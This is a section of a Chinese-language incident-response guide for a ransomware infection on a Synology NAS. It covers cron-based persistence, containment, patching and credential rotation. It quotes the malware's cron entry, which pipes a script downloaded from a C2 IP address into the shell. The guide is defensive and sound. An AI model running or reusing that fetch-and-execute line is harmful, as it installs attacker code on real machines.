## 持久化会自我重建

`/etc/cron.d/` 下出现了 **11 个** `synot*` 文件，每个都包含一行活体任务：

```
* * * * * root echo <base64> | base64 -d | sh
# 解码后：curl -s http://95.182.96.97/xdy5.sh | sh
```

其中 `synottyo.14390` 的修改时间是 **2026-10-29 10:44**——加密发生次日仍在被重新写入。这意味着单纯删文件不够：只要 C2 还通、漏洞还在，就会被重新种回去。

**一个教训值得写下来**：这批文件名是 DSM 任务计划器的命名风格，我们最初据此判断「这是 DSM 自身的产物，不是恶意的」，结论错了。**判断要基于内容，不要基于文件名。** 如果你也遇到 `synot*`，直接看里面那行是不是 `echo <base64> | base64 -d | sh`。

## 处置顺序

1. **先取证，再动手。** 需要内存就直接采集（见 [01](01-live-acquisition.md)）；不需要就至少保住勒索信、少量加密样本、`/var/log`、登录记录、`/etc/cron.d` 原件。
2. **隔离。** 拔网线或断开上行；停掉会向云端同步的套件（Cloud Sync、Drive 客户端），避免密文覆盖掉云端还没被污染的那份备份。
3. **根除。** 清持久化 + 封 C2 + 打补丁，三件一起做，缺一项都会反复：
   ```sh
   mkdir -p /volume2/quarantine/cron
   cp -a /etc/cron.d/synot* /volume2/quarantine/cron/     # 先隔离留证
   rm -f /etc/cron.d/synot*
   iptables -I OUTPUT 1 -d 95.182.96.97 -j DROP
   iptables -I INPUT  1 -s 95.182.96.97 -j DROP
   grep -q 95.182.96.97 /etc/hosts || echo "0.0.0.0 95.182.96.97" >> /etc/hosts
   ```
4. **补系统与应用。** DSM 分支对应的修复线（SA-26:13）为 7.2.1-69057-12 / 7.2.2-72806-9 / 7.3.2-86009-4 / 7.4-90075；套件侧（SA-26:14 PHP2Shell）另有 PHP / Calendar / Mail Station 的版本要求。老分支收不到补丁就只能迁移。
5. **收暴露面。** 公网不要直连 DSM 管理口，远程走 VPN + 白名单；关掉 telnet、SSH 对外、UPnP。
6. **改凭据。** 机器上的账号、套件 token、被加密数据里可能存着的第三方 cookie / API key，全部轮换。

## 不要做的四件事

- **不要删除 `.L0CK3D` 文件。** 它们是将来出现解密工具时唯一的输入，体积也不大。
- **不要拿老 Cerber 解密器或改扩展名去试。** 格式已经变了，乱试只会破坏现场。
- **不要付赎金。** 这类站点是自动化流水线，FAQ 里自己写「无法保证你的个人页面一直可访问」。本案没有付。
- **不要在 NAS 上跑扫描器或任何来历不明的「解密器」。** 扫描拉回电脑做；解密器只在隔离环境里碰。
